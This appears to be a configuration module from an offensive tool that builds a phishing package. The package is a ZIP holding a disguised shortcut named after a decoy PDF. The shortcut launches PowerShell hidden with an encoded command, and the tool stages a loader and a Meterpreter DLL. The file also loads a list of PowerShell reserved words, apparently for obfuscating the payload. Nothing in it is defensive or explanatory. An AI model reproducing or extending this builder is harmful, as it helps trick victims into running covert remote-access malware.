import ast
import configparser
import os

pdf_length_placeholder = '#<PDF_FILELENGTH>'
dll_length_placeholder = '#<DLL_FILELENGTH>'
loader_length_placeholder = '#<LOADER_FILELENGTH>'

loader_template = 'loader_template.ps1'
loader_outfile = 'loader.ps1'

stage1_template = 'stage1_command_template.ps1'
stage1_outfile = 'stage1_command.ps1'

pdf_filename = 'ds7002.pdf'
dll_filename = 'meterpreter.dll'

lnk_filename = 'ds7002.lnk'
zip_filename = 'ds7002.zip'

target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
argument_prefix = '-noni -noe -WindowStyle hidden -e '
icon = 'C:\\Windows\\System32\\SHELL32.dll'
icon_index = 1

config = configparser.ConfigParser()
PSconfigFile = os.path.abspath(os.path.dirname(__file__)) + "/PSconfig.ini"
config.read(PSconfigFile)
global Reseverd 
Reseverd = ast.literal_eval(config.get("PS_Reserverd", "f"))
global lower_Reserverd
lower_Reserverd = list(map(lambda x:x.lower(),Reseverd))